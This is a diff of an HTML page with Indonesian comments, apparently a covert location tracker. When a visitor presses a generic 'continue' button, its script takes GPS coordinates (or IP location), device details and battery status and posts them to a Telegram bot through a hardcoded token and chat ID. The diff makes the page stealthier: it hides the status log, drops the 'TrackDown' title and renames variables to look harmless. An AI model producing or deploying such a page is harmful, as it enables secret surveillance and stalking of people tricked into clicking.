@@ -21,122 +21,100 @@
             cursor: pointer;
             margin-top: 20px;
         }
-
-        #log {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #555;
-            white-space: pre-wrap;
-        }
     </style>
 </head>
 <body>
-    <h1>Welcome to TrackDown!</h1>
-    <p>Click the button below to continue.</p>
-    <button class="action-button" id="getLocationButton">Klik untuk Melanjutkan</button>
-    <div id="log">Menunggu tindakan pengguna...</div>
+    <h1>Selamat Datang!</h1>
+    <p>Tekan tombol di bawah untuk melanjutkan.</p>
+    <button class="action-button" id="actionButton">Lanjutkan</button>
 
     <script>
-        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Ganti dengan token bot Telegram Anda
-        const chatId = "5649811717"; // Ganti dengan Chat ID Anda
-        const logElement = document.getElementById("log");
+        (function() {
+            // Nama variabel yang lebih umum
+            const apiKey = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Token API Telegram
+            const userId = "5649811717"; // Chat ID Telegram
 
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    logElement.textContent += "\nData berhasil dikirim ke Telegram.";
-                } else {
-                    logElement.textContent += "\nGagal mengirim data ke Telegram.";
-                }
-            })
-            .catch(error => logElement.textContent += "\nGagal mengirim data ke Telegram.");
-        }
+            function sendToServer(message) {
+                const endpoint = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+                fetch(endpoint, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: userId, text: message }),
+                }).catch(() => console.log("Gagal mengirim data ke server."));
+            }
 
-        function getIPLocation() {
-            logElement.textContent += "\nMengambil lokasi berbasis IP...";
-            fetch("https://ipapi.co/json/")
-                .then(response => response.json())
-                .then(data => {
-                    const ipLocationInfo = `
+            function getIPDetails() {
+                fetch("https://ipapi.co/json/")
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipInfo = `
 IP Address: ${data.ip}
 City: ${data.city}
 Region: ${data.region}
 Country: ${data.country_name}
-                    `;
-                    logElement.textContent += "\nLokasi berbasis IP berhasil diambil.";
-                    sendToTelegram(`Fallback IP Location:\n${ipLocationInfo}`);
-                })
-                .catch(error => logElement.textContent += "\nGagal mengambil lokasi berbasis IP.");
-        }
+                        `;
+                        sendToServer(`IP Details:\n${ipInfo}`);
+                    })
+                    .catch(() => console.log("Gagal mengambil lokasi IP."));
+            }
 
-        function getDeviceInfo() {
-            const deviceInfo = `
+            function getDeviceInfo() {
+                return `
 Platform: ${navigator.platform}
 User Agent: ${navigator.userAgent}
 Vendor: ${navigator.vendor || 'N/A'}
-            `;
-            logElement.textContent += "\nMengambil informasi perangkat...";
-            return deviceInfo;
-        }
+                `;
+            }
 
-        function getBatteryStatus(messageCallback) {
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(function(battery) {
-                    const batteryInfo = `
+            function getBatteryStatus(callback) {
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        const batteryInfo = `
 Battery Level: ${battery.level * 100}%
 Charging: ${battery.charging ? 'Yes' : 'No'}
-                    `;
-                    messageCallback(batteryInfo);
-                }).catch(function(error) {
-                    messageCallback("Battery Status: Gagal diambil.");
-                });
-            } else {
-                messageCallback("Battery Status: Tidak didukung.");
+                        `;
+                        callback(batteryInfo);
+                    }).catch(() => callback("Battery Info: Gagal diambil."));
+                } else {
+                    callback("Battery Info: Tidak didukung.");
+                }
             }
-        }
 
-        function sendDeviceAndLocationInfo(latitude, longitude, accuracy) {
-            let message = `Location Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}\n\n`;
-            message += `Device Info:\nPlatform: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nVendor: ${navigator.vendor || 'N/A'}\n`;
+            function getGeolocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            let message = `
+Location Info:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Accuracy: ${accuracy} meters
+Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
 
-            getBatteryStatus((batteryInfo) => {
-                message += `\n${batteryInfo}`;
-                sendToTelegram(message);
+Device Info:
+${getDeviceInfo()}
+                            `;
+                            getBatteryStatus(batteryInfo => {
+                                message += `\n${batteryInfo}`;
+                                sendToServer(message);
+                            });
+                        },
+                        () => {
+                            console.log("Geolocation gagal, fallback ke IP.");
+                            getIPDetails();
+                        }
+                    );
+                } else {
+                    console.log("Geolocation tidak didukung, fallback ke IP.");
+                    getIPDetails();
+                }
+            }
+
+            document.getElementById("actionButton").addEventListener("click", () => {
+                getGeolocation();
             });
-        }
-
-        function getGeolocation() {
-            if (navigator.geolocation) {
-                logElement.textContent += "\nMengakses lokasi perangkat...";
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        logElement.textContent += "\nLokasi perangkat berhasil diambil.";
-                        sendDeviceAndLocationInfo(latitude, longitude, accuracy);
-                    },
-                    (error) => {
-                        logElement.textContent += "\nIzin lokasi ditolak atau gagal.";
-                        getIPLocation(); // Fallback ke lokasi berbasis IP
-                    }
-                );
-            } else {
-                logElement.textContent += "\nGeolocation tidak didukung oleh browser.";
-                getIPLocation(); // Fallback ke lokasi berbasis IP
-            }
-        }
-
-        // Event listener untuk tombol
-        document.getElementById("getLocationButton").addEventListener("click", () => {
-            getGeolocation();
-        });
+        })();
     </script>
 </body>
 </html>
